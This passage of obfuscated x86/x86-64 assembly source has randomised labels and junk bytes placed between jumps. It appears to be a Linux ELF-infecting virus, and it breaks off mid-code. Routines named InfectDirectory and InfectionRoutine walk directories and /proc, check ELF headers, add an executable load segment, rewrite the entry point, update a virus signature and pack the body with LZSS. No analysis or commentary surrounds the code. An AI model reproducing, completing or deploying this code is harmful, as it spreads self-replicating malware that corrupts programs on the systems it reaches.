    jb          ..@lywvGzYgsaJ5
    jae         ..@lywvGzYgsaJ5
..@POieD0xhJdu5:
    xor         rax, rax
    xor         rdx, rdx
    js          ..@ZauhbCjyYQdl
    jns         ..@ZauhbCjyYQdl
..@84jEznymDDGp:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    add         r5, rax
    js          ..@VtZFTVR86yx7
    jns         ..@VtZFTVR86yx7
..@wnMcuPy5FUgy:
    xor         rax, rax
    jmp         $+4
db 0xfa, 0x2f
    jmp         ..@e1mBqM7l1j93
..@saSBHSM8RlE5:
    jz          ..@0gciQTYG20PJ
    movzx       rax, BYTE [r2]
    mov         [r1], rax
    jmp         $+5
db 0x5b, 0x41, 0x22
    jmp         ..@wZ3gNGSXS9mq
..@YJPKcIJIgDDd:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+5
db 0x50, 0xed, 0xa9
    jb          ..@aISdAxRTjYiM
    jae         ..@aISdAxRTjYiM
..@qGAOaolWu1d0:
    xor         r3, r3
    xor         r4, r4
    je          ..@YSJsXRM0YsSr
    jne         ..@YSJsXRM0YsSr
..@VnxmuW91zIFI:
    and         ax, 1111b
    jmp         $+5
db 0x70, 0x5e, 0x1b
    js          ..@hvkFPDOlHn3w
    jns         ..@hvkFPDOlHn3w
..@4ZDE2zgVmwnW:
    mov         r2, r5
    call        Strcpy
    jmp         $+4
db 0xfa, 0x05
    jmp         ..@6GxFbQQGqUyA
..@bYKHuv7XEbYz:
    mov         r3, _signature.startsize
    call_vsp    Strncmp
    test        rax, rax
    jmp         $+5
db 0x78, 0x27, 0xb6
    jmp         ..@xggPZb98iCPw
..@K6v6N0zeZPwf:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    js          ..@VrwBPl3fK9S1
    jns         ..@VrwBPl3fK9S1
..@BLtOfbe28x60:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jmp         $+3
db 0x53
    jmp         $+4
db 0x00, 0x9e
    js          ..@Gi66SrK0YdF0
    jns         ..@Gi66SrK0YdF0
..@TSkbAGau9jDj:
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jl          ..@4BKr9WgzzW1S
    jge         ..@4BKr9WgzzW1S
..@FTK5uvvRRGNV:
%ifdef X86_64
    xor         rdx, rdx
    xor         r10, r10
    xor         r9, r9
%endif
    jmp         $+4
db 0x0c, 0x95
    jl          ..@ffL7a9gg9ukD
    jge         ..@ffL7a9gg9ukD
..@ju1XxPHbn5gb:
    jmp         ..@euuEa0fW43Iv
    jmp         $+3
db 0x07
    jmp         $+5
db 0xb0, 0xcd, 0x54
    js          ..@ZUdwnS592kxe
    jns         ..@ZUdwnS592kxe
..@I6dQOwxJdLxi:
    cmp         eax, 0x03
    jl          ..@yPMZPERcrcUG
    js          ..@cOHdfQIPapmv
    jns         ..@cOHdfQIPapmv
..@4dnxtYuESPaq:
    jl          ..@8rJYtOwNTCCE
    jmp         $+3
db 0x1f
    jb          ..@a9lbKICOBZ5r
    jae         ..@a9lbKICOBZ5r
..@aNoHtXbk9uHY:
    push        r2
    push        r3
    jmp         $+3
db 0xbb
    js          ..@TTWJ4mnxLXV6
    jns         ..@TTWJ4mnxLXV6
..@8HixdbI99e65:
    jmp         ..@Gd6cFRm7kHZN
    jmp         $+4
db 0xe9, 0x9d
    je          ..@HUhjopsW1qpk
    jne         ..@HUhjopsW1qpk
..@ual95S5jRqtH:
    jmp         ..@ej65ZzKjvLsa
    jmp         $+5
db 0xd7, 0x0f, 0x1f
    jb          ..@Ay0Bf7Fn2y08
    jae         ..@Ay0Bf7Fn2y08
..@MgjANKaPl1LN:
    pop         r3
    jb          ..@YUarNTrxk736
    jae         ..@YUarNTrxk736
..@Wr9LCKKCOVq5:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+4
db 0x12, 0x8c
    jmp         ..@PaPGV0N0tEd7
..@vs2p6tc4FMs5:
    sub         rsp, _PROC_OFF_size
    VAR         packed, procdir
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    jmp         $+4
db 0xb4, 0x7f
    jmp         ..@Cv8AofGoq972
..@cFzLQnUX2T44:
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         $+4
db 0xd1, 0x4d
    js          ..@aF6hf4UB6MPi
    jns         ..@aF6hf4UB6MPi
..@WaEEIpCaaTmf:
    jnz         ..@6iHaSqzKkkPE
    jmp         $+3
db 0xa6
    jmp         ..@mV1A4zx0WmbP
..@V9RWFNwAZLeP:
    mov         rcx, signature_len
    jb          ..@w6G98YpLK78T
    jae         ..@w6G98YpLK78T
..@OaQhCKndHfvF:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+3
db 0x0d
    js          ..@40pJEMZnuRUV
    jns         ..@40pJEMZnuRUV
..@HUhjopsW1qpk:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    mov         r3, rax
    jmp         $+3
db 0x38
    jmp         $+5
db 0xc0, 0xaa, 0x2c
    jmp         $+4
db 0x4d, 0xa9
    jb          ..@Y0SfeYiv2Pdo
    jae         ..@Y0SfeYiv2Pdo
..@9KS8sBPXF7qt:
    xor         rax, rax
    jmp         ..@S5FKs9k29EgY
..@bNjy9EnoKbD9:
%ifdef X86_64
    syscall
%endif
    jmp         $+3
db 0x1f
    jmp         $+3
db 0xba
    jmp         $+3
db 0x5a
    je          ..@eY1K1M5PBGMx
    jne         ..@eY1K1M5PBGMx
..@D73XcWd2C3dT:
    mov         r5, r3
    mov         r3, rax
    jb          ..@QZL7KSgZ8ywh
    jae         ..@QZL7KSgZ8ywh
..@awGIg6lC4D2W:
    push        r5
    cmp         r3, 0x00
    jmp         $+3
db 0x00
    jmp         $+3
db 0xac
    jmp         $+3
db 0xe5
    jb          ..@omUPQJ9iuqkO
    jae         ..@omUPQJ9iuqkO
..@b62JGoGb3HNZ:
    GGLOBAL     _signature
    mov         r1, r5
    jmp         ..@bYKHuv7XEbYz
..@Q4m9ni0Rx1mo:
    mov         r2, QWORD [r1+file.filesize]
    cmp         rax, r2
    jne         ..@4BxzAjnCWS4s
    jmp         ..@2phrMpUTt3jh
..@s3CQhgvYrxm3:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jmp         $+3
db 0x9b
    jmp         ..@Qz79efy2Pb28
..@ybxGIdtMjje3:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0x18, 0x84
    jmp         ..@CSjfQY8M95dR
..@lFqLzxzmaoAy:
    call        IsELFComplete
    test        al, al
    jnz         ..@lsrxRNxO1dmY
    jb          ..@Z3gDqWEZIF10
    jae         ..@Z3gDqWEZIF10
..@ehFobrxPjNph:
    xor         rax, rax
    xor         rdi, rdi
    je          ..@FU9VppnTW1I7
    jne         ..@FU9VppnTW1I7
..@7hzF7QHvjdP4:
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    jl          ..@dujU6Me7FpQR
    jge         ..@dujU6Me7FpQR
..@QrDxmwxg0xUL:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         ..@bNjy9EnoKbD9
..@rQxax0Ln1Sbl:
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         $+4
db 0x07, 0xa4
    jmp         $+5
db 0x27, 0xbe, 0x9c
    jb          ..@3gXhU5QImkdC
    jae         ..@3gXhU5QImkdC
..@Z3gDqWEZIF10:
    mov         rax, 1
    jmp         $+4
db 0xf5, 0x99
    js          ..@z0xXHDU3QKMQ
    jns         ..@z0xXHDU3QKMQ
..@OX1iWJ3FaBHB:
    mov         r1, r5
    jmp         ..@77PdTXrq5sYZ
..@9HzX29A27Syp:
    call        Strcpy
    mov         BYTE [r1], '/'
    add         r1, 1
    jmp         $+5
db 0x24, 0xe7, 0x31
    jmp         $+5
db 0x90, 0x83, 0x01
    jmp         $+4
db 0x19, 0xcb
    jmp         $+5
db 0xd8, 0x7f, 0x0f
    jmp         $+4
db 0x76, 0xb5
    jb          ..@V3sEezbuAyAb
    jae         ..@V3sEezbuAyAb
..@rKunHPjrEW4X:
    jl          ..@3uVNz1ir4sHk
    jb          ..@RWWF6JqWbrHn
    jae         ..@RWWF6JqWbrHn
..@VtZFTVR86yx7:
    sub         r5, 1
    jmp         $+3
db 0xa0
    je          ..@QLDyIRAQVtcS
    jne         ..@QLDyIRAQVtcS
..@DcfaDhhGaAcZ:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jb          ..@BIOGBd0jmG7v
    jae         ..@BIOGBd0jmG7v
..@tdRzVJRMCVmT:
    call        Strcpy
    js          ..@TpGHkCVS9LTD
    jns         ..@TpGHkCVS9LTD
..@4kRuFTYRuJR5:
    sub         dl, cl
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jle         ..@y5oqMFwavmZD
    jmp         ..@Egs1JIkX3bSo
..@gd98rcYricTG:
    mov         r5, r1
    jl          ..@UGIplteGu2Gb
    jge         ..@UGIplteGu2Gb
..@ZipjsXgsz6NS:
    xor         rax, rax
    jmp         ..@nyld1e4PlQBr
..@SwFTvu0xO5k2:
    shr         dx, 0x4
    add         ecx, 1
    jmp         $+3
db 0x47
    jmp         $+3
db 0xf7
    jmp         ..@Rkr4BI3bEH27
..@binAT9m3fVDc:
    rep         stosb
    jl          ..@mCmN0FkSYNDw
    jge         ..@mCmN0FkSYNDw
..@zmOSneguy62o:
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    js          ..@HRMWWCOyFdG7
    jns         ..@HRMWWCOyFdG7
..@dBBk0JSlKssF:
    and         r2, 0x00ffffff
    cmp         r2d, '../'
    jmp         $+3
db 0xf7
    jl          ..@Wueh5ufWGc4A
    jge         ..@Wueh5ufWGc4A
..@67pC09vXOZ3P:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
    mov         edx, 11b
    mov         esi, 0x01
%endif
    jmp         $+5
db 0xf4, 0xb7, 0x04
    jb          ..@m4dy8ADf367O
    jae         ..@m4dy8ADf367O
..@FLCq9KmgNSsB:
    mov         r1, QWORD [r5+file.filename]
    cmp         BYTE [r1], '/'
    jne         ..@lsrxRNxO1dmY
    jb          ..@NF0lXMBniLbp
    jae         ..@NF0lXMBniLbp
..@fiQcplWSg65O:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r3, r2
    jmp         $+3
db 0x6c
    jmp         ..@DqWdiCKqXrZx
..@yfYzutYWRqnJ:
    ret
    jmp         ..@lsrxRNxO1dmY
..@SI1lEJhUeuOZ:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    je          ..@rKunHPjrEW4X
    jne         ..@rKunHPjrEW4X
..@EPCScpJhypn6:
    add         rcx, 2*bytes
    jmp         $+3
db 0xfe
    jl          ..@xqm2fJirjvJJ
    jge         ..@xqm2fJirjvJJ
..@cOHdfQIPapmv:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jmp         $+4
db 0xf9, 0x49
    jmp         $+3
db 0x5c
    jmp         $+3
db 0xb6
    jb          ..@nrmcUzOm62AS
    jae         ..@nrmcUzOm62AS
..@xm5M6TpNyPKr:
    xor         rcx, rcx
    jmp         ..@s7mNbStXFytJ
..@2phrMpUTt3jh:
    xor         rax, rax
    jmp         $+3
db 0xd9
    jmp         $+4
db 0x15, 0x0b
    jmp         $+5
db 0x5e, 0x77, 0x3d
    jl          ..@WKNafgZ3kLCX
    jge         ..@WKNafgZ3kLCX
..@xPj5oJzMZJBF:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         ..@Zcgs1e5yGNUj
..@xgOe7JTb2H9h:
    OFILE       [r1], 0x10000
    js          ..@I6dQOwxJdLxi
    jns         ..@I6dQOwxJdLxi
..@FoKo9L151E7b:
    call        MemMove
    je          ..@V9RWFNwAZLeP
    jne         ..@V9RWFNwAZLeP
..@WsiYH3eT8f0j:
    sub         r4, QWORD [r1+e_h.e_entry]
    jmp         $+3
db 0xc3
    jmp         ..@CbjOeNs2uB8E
..@dujU6Me7FpQR:
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+4
db 0xbb, 0xaf
    jl          ..@vBLtEMuL1tY6
    jge         ..@vBLtEMuL1tY6
..@N9Mo6es9etec:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jb          ..@ZipjsXgsz6NS
    jae         ..@ZipjsXgsz6NS
..@Jf3YEJY80kAR:
    call_vsp    Strlen
    add         r5, rax
    jmp         $+4
db 0xc9, 0xfa
    je          ..@r906VBpOCNL4
    jne         ..@r906VBpOCNL4
..@usm1spK8ILz6:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         ..@COdNIXAjfRSb
..@RhwAFbsQk17z:
    xor         r2, r2
    jb          ..@IQENnfnKVMo5
    jae         ..@IQENnfnKVMo5
..@X98vU0MVddqW:
    sub         rsi, 1
    jmp         $+5
db 0xe8, 0xa9, 0x63
    js          ..@C0z6esBUdcb6
    jns         ..@C0z6esBUdcb6
..@6f9XKeKC3fyE:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    je          ..@azRmhjqbwF9z
    jne         ..@azRmhjqbwF9z
..@WGlI1NXXqwSY:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jle         ..@ioyWjQ5mcaae
    jmp         $+5
db 0xbf, 0xa8, 0x74
    js          ..@5DXo23lJOqIw
    jns         ..@5DXo23lJOqIw
..@tuuixxHLb5Zy:
    rep         movsb
    jmp         ..@616NPtyqPn63
..@QgQdJMyrhk7a:
    pop         r2
    cmp         rax, 0x00
    jmp         $+4
db 0xd9, 0x97
    jb          ..@FiKPaav11RK6
    jae         ..@FiKPaav11RK6
..@XetoShgGz7aW:
    xor         r1, r1
    jl          ..@6RoGOIM2nDHk
    jge         ..@6RoGOIM2nDHk
..@A9VKNpFY7riK:
    mov         r2, vsp
    jmp         $+4
db 0xe0, 0xf9
    jmp         ..@xC6QOrzoOLUT
..@U4LC03WW1yCd:
    ret
    jmp         $+3
db 0x32
    jmp         $+5
db 0xe2, 0xd3, 0x07
    jmp         $+4
db 0x8c, 0x82
    jmp         $+3
db 0xaf
    jmp         DYNPIEValidation
..@ERlzDxHmndSk:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    js          ..@4kRuFTYRuJR5
    jns         ..@4kRuFTYRuJR5
..@OaEDdqOW903L:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         ..@FV1tqsRXDtun
..@Cv8AofGoq972:
    mov         r1, r5
    js          ..@cCPucnqVfrIj
    jns         ..@cCPucnqVfrIj
..@TpGHkCVS9LTD:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    jmp         $+4
db 0xd1, 0xf1
    jmp         ..@eS6kJkMCOlAt
..@G8J3qwFLkxsZ:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         $+3
db 0x55
    jmp         $+4
db 0x30, 0xc2
    jmp         $+3
db 0x9a
    jmp         ..@7rDilQGfzbZy
..@lywvGzYgsaJ5:
    cmp         eax, 0x00
    jl          ..@nRtImfModyJv
    je          ..@9TuPDvn8qdiK
    jmp         $+3
db 0x34
    jl          ..@wzl5lYJQvsar
    jge         ..@wzl5lYJQvsar
..@VrwBPl3fK9S1:
    test        eax, eax
    jz          ..@ILFuuzyNwwVx
    jmp         $+5
db 0x08, 0xe9, 0x3d
    jmp         $+4
db 0x8f, 0x59
    jl          ..@pptnV0zp6suR
    jge         ..@pptnV0zp6suR
..@rchis7iqljwr:
    mov         ax, WORD [r5+e_h.e_shentsize]
    je          ..@eG0Mr33tpY9f
    jne         ..@eG0Mr33tpY9f
..@FY6pjiMu0i8B:
    cmp         BYTE [r1], DT_DIR
    jne         ..@ILFuuzyNwwVx
    jl          ..@K6v6N0zeZPwf
    jge         ..@K6v6N0zeZPwf
..@JVcwtL453T2T:
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jmp         $+4
db 0x1f, 0x52
    jmp         ..@GBEKURlDXUiW
UpdateSignature:
    jmp         ..@2u73pfP6UK9f
..@TLgFmr4pt3Wm:
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jl          ..@esCw0L3e83I2
    jge         ..@esCw0L3e83I2
..@ePcDwQE5E4H9:
    mov         r3, r1
    sub         r3, PADDING
    mov         r2, original_virus_len-non_packed_len
    jmp         $+4
db 0xa0, 0x47
    jmp         ..@Jj82UGXYo1aK
..@4BxzAjnCWS4s:
    mov         rax, 1
    jb          ..@rD2cXF7ZO4YY
    jae         ..@rD2cXF7ZO4YY
InfectDirectory:
    jmp         ..@rSOURfNrjQur
MemMove:
    jmp         ..@Hdj4TJLX1Eyl
..@Gd6cFRm7kHZN:
    mov         rax, r2
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3 
    jmp         $+5
db 0x55, 0x37, 0x14
    jmp         ..@VTPxk9lykrYx
..@PUOjOK1p4ttG:
    ret
    js          IsNum
    jns         IsNum
..@ihwnYo1hhq3t:
    cmp         BYTE [r1], 0x0
    js          ..@js4SGjaxQUky
    jns         ..@js4SGjaxQUky
..@mCmN0FkSYNDw:
    xor         rax, rax
    xor         r2, r2
    mov         r1, m6
    jl          ..@Q38adMME29NV
    jge         ..@Q38adMME29NV
WORDToDWORDASCII:
    jmp         ..@l46LJYz4unQo
..@glpZTnE4Q9X4:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jne         ..@FLCq9KmgNSsB
    jb          ..@FsmAu6mYsZ8L
    jae         ..@FsmAu6mYsZ8L
..@ojYYcruAo1CH:
    test        rax, rax
    jmp         ..@5dFqxetLkZ7u
..@2Ol2331izW8t:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+3
db 0x95
    js          ..@m2pGt0M8bhFg
    jns         ..@m2pGt0M8bhFg
..@TTWJ4mnxLXV6:
    call        GetNewProgramVaddr
    pop         r3
    je          ..@QgQdJMyrhk7a
    jne         ..@QgQdJMyrhk7a
..@C0WeQk6sV2IE:
    sub         rsp, _DYNPIE_OFF_size
    jmp         $+5
db 0x82, 0xd1, 0x78
    je          ..@9KS8sBPXF7qt
    jne         ..@9KS8sBPXF7qt
..@LMDl7KmZGNiK:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jmp         ..@ehFobrxPjNph
..@f8ZYfPsWGEfr:
    jne         ..@EPCScpJhypn6
    jb          ..@79Y67X3uJrj6
    jae         ..@79Y67X3uJrj6
..@lsrxRNxO1dmY:
    xor         rax, rax
    jmp         $+5
db 0xeb, 0xca, 0xf2
    jmp         $+4
db 0x37, 0x77
    je          ..@GX5fOqx7jm58
    jne         ..@GX5fOqx7jm58
..@GX5fOqx7jm58:
    ret
    je          NonBinaryFile
    jne         NonBinaryFile
..@z0xXHDU3QKMQ:
    ret
    jmp         $+4
db 0xcb, 0xa8
    jmp         ..@FLCq9KmgNSsB
..@s5r1kNfFqhEI:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+3
db 0xb5
    jl          ..@t2ICBlD3q23b
    jge         ..@t2ICBlD3q23b
..@NNyIiXiAxQl7:
    mov         r3, rax
    call_vsp    Strncmp
    test        ax, ax
    jmp         $+4
db 0x89, 0x8b
    jmp         $+5
db 0x71, 0x1b, 0x86
    jmp         $+5
db 0x8e, 0x23, 0x3e
    jmp         ..@eKzn1BW5MpxW
..@XoZL0fvr8HJX:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+4
db 0xad, 0x79
    jmp         ..@xgOe7JTb2H9h
..@y4NQukbkwPeO:
    mov         BYTE [rdi], al
    jmp         $+3
db 0x66
    jb          ..@He2bMMJclM0I
    jae         ..@He2bMMJclM0I
..@esCw0L3e83I2:
    jmp         ..@y5oqMFwavmZD
    jmp         ..@POieD0xhJdu5
..@3hsRmOzXhkpT:
    ret
    jmp         MemMove
..@fNSudO0Jcbl5:
    call_vsp    ExitProgram
    jmp         ..@Tz071gMscT7I
..@azRmhjqbwF9z:
    xor         rax, rax
    xor         rcx, rcx
    xor         rbx, rbx
    jmp         $+4
db 0x88, 0xd3
    jmp         ..@lwMXdA0hp9F9
..@5DXo23lJOqIw:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    js          ..@ioyWjQ5mcaae
    jns         ..@ioyWjQ5mcaae
..@kz9sDqQCameL:
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    je          ..@QIFNOHBegV8C
    jne         ..@QIFNOHBegV8C
..@bBmaJM5Nnte9:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    pop         r4
    jmp         $+5
db 0xcf, 0x12, 0x23
    jb          ..@5sdBo8hPKRyb
    jae         ..@5sdBo8hPKRyb
..@uhcQ4Roh9CJw:
    mov         r4, 0x1
    jmp         ..@wnMcuPy5FUgy
..@JdTG9TjWqhmY:
    add         r4, r3
    jmp         ..@ESiCsSHVmHIn
..@SpAWFW4KycJU:
    call        MemMove
    jmp         $+3
db 0xcd
    jmp         ..@8XoilklbxX3T
..@Xz94S5R0nMP4:
    call        DYNPIEValidation
    jmp         $+4
db 0x05, 0x96
    jl          ..@ojYYcruAo1CH
    jge         ..@ojYYcruAo1CH
..@tvphuN1THXBF:
    add         rdi, virus_len-_start
    mov         rsi, m7
    jmp         $+3
db 0xc7
    jl          ..@vKrj5fTFfEcj
    jge         ..@vKrj5fTFfEcj
..@gXtFxQ2HVyR0:
    xor         rax, rax
    js          ..@XetoShgGz7aW
    jns         ..@XetoShgGz7aW
..@D5Wqi7wAM3ma:
    rep movsb 
    jmp         ..@AhYZ2QbGV74B
..@GR4PWfpDAadO:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0x75, 0xa6
    jmp         $+3
db 0x8a
    jmp         ..@y4NQukbkwPeO
..@QWIMFFoewkp9:
    jmp         ..@pKysl2wLF12v
    jmp         ..@MfZ6he4x2IKp
..@rILw5VuCdXsp:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+3
db 0x34
    js          ..@aaNLw9LlpHTO
    jns         ..@aaNLw9LlpHTO
..@m4dy8ADf367O:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+3
db 0x32
    jmp         $+4
db 0x58, 0xaa
    jmp         $+4
db 0x5d, 0x37
    jmp         $+5
db 0x6a, 0x52, 0x34
    jb          ..@lE12NndRsRdq
    jae         ..@lE12NndRsRdq
..@ZsvSNf7dJ8lb:
%ifdef X86_32
    xor         eax, eax
    xor         ebx, ebx
%endif
    jmp         $+5
db 0x63, 0xd0, 0x5b
    jmp         $+5
db 0x92, 0x26, 0x0f
    jb          ..@67pC09vXOZ3P
    jae         ..@67pC09vXOZ3P
..@6oFBFbm5iZQH:
    mov         rsi, rdi
    jmp         $+5
db 0xa1, 0x9d, 0x56
    jmp         ..@1KoEGiYgOF3S
..@C9BjFJJF4PTQ:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+4
db 0x89, 0x50
    jmp         $+3
db 0x2e
    jmp         ..@ZpbUa3hFwlwU
..@4lVGqbyt8kzO:
    xor         rax, rax
    jmp         $+5
db 0x3a, 0xa3, 0xba
    jl          ..@rchis7iqljwr
    jge         ..@rchis7iqljwr
..@BDEk2VWBSnzH:
    add         rsp, _PROC_OFF_size
    je          InfectionRoutine
    jne         InfectionRoutine
..@uQqs81K0AI4f:
    pop         r1
    cmp         r1, 0x00
    je          ..@nRtImfModyJv
    jmp         ..@eNZAwRuqqkgy
..@ttOAdsWh1y1x:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@ka0jQnnnblRE
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jl          ..@f8ZYfPsWGEfr
    jge         ..@f8ZYfPsWGEfr
..@UpkXpCzeawFY:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    mov         DWORD [r2], PT_LOAD
    jmp         $+5
db 0xf6, 0xf0, 0xe9
    js          ..@uaLv1ug2aDj3
    jns         ..@uaLv1ug2aDj3
..@cInF6ArauVeL:
    test        al, al
    jmp         ..@on0FKbBGuL5Z
..@Jpw4BwKAjlK7:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    add         rsp, _LZSSE_OFF_size
    ret
    jmp         $+3
db 0xde
    jmp         $+3
db 0xb1
    jb          UpdateSignature
    jae         UpdateSignature
..@UK8WKGhnb5YT:
    mov         r1, r4
    jmp         $+4
db 0xe2, 0x89
    je          ..@GSC8uJv2y7Lu
    jne         ..@GSC8uJv2y7Lu
..@5zE66LUpYUst:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
%endif
    jb          ..@FTK5uvvRRGNV
    jae         ..@FTK5uvvRRGNV
..@FfxFhndU7bMs:
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         ..@cHBrIBkLgoVX
..@xqm2fJirjvJJ:
    jmp         ..@ttOAdsWh1y1x
    jmp         $+4
db 0x9d, 0x4f
    js          ..@ka0jQnnnblRE
    jns         ..@ka0jQnnnblRE
..@9K4QEOzg5fPE:
    je          ..@DvWom2mYU3HG
    jmp         $+5
db 0x9b, 0x4b, 0xdf
    jmp         $+3
db 0x3c
    jmp         ..@AqSZKmHmdrWy
..@r906VBpOCNL4:
    add         r5, 1
    jl          ..@So894saMXbsk
    jge         ..@So894saMXbsk
..@hT0uUjCo1VYv:
    mov         r5, r1
    xor         rax, rax
    jmp         $+3
db 0xb2
    js          ..@ePI4vMzga5R1
    jns         ..@ePI4vMzga5R1
..@UUiYVyRZYi4c:
    add         rsp, _INFFILE_OFF_size
    js          ..@054cato4LXbq
    jns         ..@054cato4LXbq
..@GSC8uJv2y7Lu:
    mov         rax, [r5+file.filesize]
    add         rax, r2
    mov         r2, rax
    jmp         $+3
db 0x8c
    jb          ..@fxcdh7nAPugj
    jae         ..@fxcdh7nAPugj
..@w8Z7fews0leV:
    mov         r1d, eax
    mov         r3d, 0x02
    jmp         $+5
db 0x36, 0x2e, 0xea
    js          ..@Gw3M2VJhuWlh
    jns         ..@Gw3M2VJhuWlh
..@kXAAJ7PiPK4t:
    mov         QWORD m5, 0x01
    jmp         $+5
db 0xb5, 0x20, 0x5b
    jmp         ..@kcyKEucwC1HK
..@sFoTWZufsLXw:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    jmp         $+4
db 0x75, 0x70
    jb          ..@SpAWFW4KycJU
    jae         ..@SpAWFW4KycJU
..@ivKP0DeHmZcF:
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         ..@pND99SDFJXmC
    jmp         $+3
db 0xe4
    jmp         $+5
db 0xc7, 0x22, 0x1e
    jmp         ..@CBw5mMcFQ45P
..@Mrh0MoD2KLuS:
    xor         rbx, rbx
    js          ..@kwK632gyAST4
    jns         ..@kwK632gyAST4
..@GbvNTfagsbSZ:
%ifdef X86_64
    syscall
%endif
    js          ..@T4Tp1S4qMh9V
    jns         ..@T4Tp1S4qMh9V
..@9TuPDvn8qdiK:
    mov         rax, SYS_FORK
    jl          ..@4kAGtYF209QB
    jge         ..@4kAGtYF209QB
..@UOxCvMUvgG9u:
    mov         ecx, WINDOW_LENGTH*2
    jmp         ..@wfZJsal6p2cD
..@ln0Rik1zYHIz:
    test        r2, r2
    jnz         ..@lsrxRNxO1dmY
    mov         r1, r5
    jmp         $+5
db 0x53, 0x3b, 0xce
    jmp         $+3
db 0xb4
    jmp         ..@lFqLzxzmaoAy
..@eS6kJkMCOlAt:
    VAR         packed, status
    jb          ..@4ZDE2zgVmwnW
    jae         ..@4ZDE2zgVmwnW
..@0UQVTgcJs5sR:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    jmp         $+5
db 0xb9, 0x0e, 0xf4
    jl          ..@N9Mo6es9etec
    jge         ..@N9Mo6es9etec
..@W8IRcwkOikd0:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jmp         $+5
db 0x89, 0x16, 0xdb
    jmp         $+4
db 0x36, 0x31
    jmp         ..@wZrav6LPEbqq
..@jLSNbcFWHopA:
    sub         rcx, rax
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0x4f, 0x2a
    jb          ..@OaEDdqOW903L
    jae         ..@OaEDdqOW903L
..@qVphEtHpxWcs:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+4
db 0x71, 0x20
    jl          ..@UdFBplhdGWJS
    jge         ..@UdFBplhdGWJS
..@FV1tqsRXDtun:
